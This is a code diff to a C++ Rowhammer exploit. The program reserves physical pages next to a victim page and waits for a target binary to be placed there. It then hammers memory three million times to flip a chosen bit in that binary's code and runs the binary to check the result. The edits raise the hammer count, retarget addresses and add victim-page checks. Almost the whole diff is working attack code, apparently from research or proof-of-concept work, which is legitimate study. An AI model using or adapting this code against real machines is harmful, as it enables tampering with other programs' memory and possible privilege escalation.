@@ -9,36 +9,10 @@ using namespace std;
 
 const string green="\033[0;32m", blue="\033[1;34m", red="\033[1;31m", yellow="\033[0;33m", restore="\033[0m";
 
-uint64_t _mb(uint64_t b)
-{
-    return b / 1024000ull;
-}
-
-uint64_t get_binary_pa_offset(const string &path, uint64_t offset)
-{
-    int fd;
-    unsigned sz;
-    struct stat st;
-    void *image;
-    uint64_t ret;
-
-    ASSERT(-1 != (fd = open(path.c_str(), O_RDONLY)) );
-    fstat(fd, &st);
-    sz = st.st_size;
-
-    ASSERT(0 != (image = mmap(0, sz, PROT_READ, MAP_PRIVATE, fd, 0)) );
-    mlock(image, sz);
-    ret = v2p(image+offset);
-
-    munlock(image, sz);
-    close(fd);
-    munmap(image, sz);
-    return ret;
-}
-
 int main(int argc, char **argv)
 {
     BinaryInfo target;
+    string dummy;
 
     target.path = "./target";
     target.flip_to = 0;
@@ -46,7 +20,8 @@ int main(int argc, char **argv)
     target.orig = 0x5f;
     target.target = 0x5b;
 
-    HammerResult hr("0x5988000,2800,0x5966000,0x59ab000,0xfb,0");
+    //HammerResult hr("0x5988000,2800,0x5966000,0x59ab000,0xfb,0");
+    HammerResult hr("0x3547000,2800,0x3520000,0x3564000,0xfb,0");
 
     uint64_t avail_size, pool_size, target_pa, i, tmp=0;
     Page a, b;
@@ -55,14 +30,15 @@ int main(int argc, char **argv)
     avail_size = get_available_mem();
     pool_size = (uint64_t)(avail_size * 0.9);
     pool_size -= pool_size % PAGE_SIZE;
-    cout << blue << "- Available mem: " << _mb(avail_size) << "M, pool size: " << _mb(pool_size) << "M." << endl;
-    cout << "- target pa=0x" << hex << get_binary_pa_offset(target.path, target.offset) << restore << endl;
+    cout << blue << "- Available mem: " << to_mb(avail_size) << "M, pool size: " << to_mb(pool_size) << "M." << endl;
+    cout << "- target pa=0x" << hex << get_binary_pa(target.path, target.offset) << restore << endl;
 
 
     {
         vector<Page> pool;
+        Page c;
 
-        pool = allocate_mb(_mb(pool_size));
+        pool = allocate_mb(to_mb(pool_size));
 
         for (Page pg : pool)
         {
@@ -80,19 +56,30 @@ int main(int argc, char **argv)
                 mlock(pg.v.get(), PAGE_SIZE);
                 b = pg;
             }
+            if (pg.p == hr.base)
+            {
+                c = pg;
+                cout << green << "Victim page: " << hex << pg.p << " is available." << endl;
+            }
         }
         for (Page pg : pool)
             if (!(pg == a || pg == b)) pg.reset();
+        if (!c.p)
+        {
+            cout << yellow << "* Victim page 0x" << hex << hr.base << " not available." << endl;
+            munlock(a.v.get(), PAGE_SIZE);
+            a.reset(); a.p=0;
+        }
     }
 
     if (a.p && b.p)
     {
         cout << blue << "* Start waylaying now (manually)..." << endl;
-        pause();
+        cin >> dummy;
         cout << green << "- Check original program..." << restore << endl;
         system("./target");
-        cout << blue << "* Hammering 1000000 times..." << endl;
-        hammer_loop(a.v.get(), b.v.get(), 1000000, 0);
+        cout << blue << "* Hammering 3000000 times..." << endl;
+        hammer_loop(a.v.get(), b.v.get(), 3000000, 0);
         cout << green << "- Check result" << endl;
         system("./target");
     }
@@ -100,5 +87,8 @@ int main(int argc, char **argv)
     {
         cout << yellow << "* Cannot hold attack pages 0x" << hex << hr.p << ", 0x" << hr.q << ". Exit..." << endl;
     }
+    if (a.p) munlock(a.v.get(), PAGE_SIZE);
+    if (b.p) munlock(b.v.get(), PAGE_SIZE);
+
     return 0;
 }
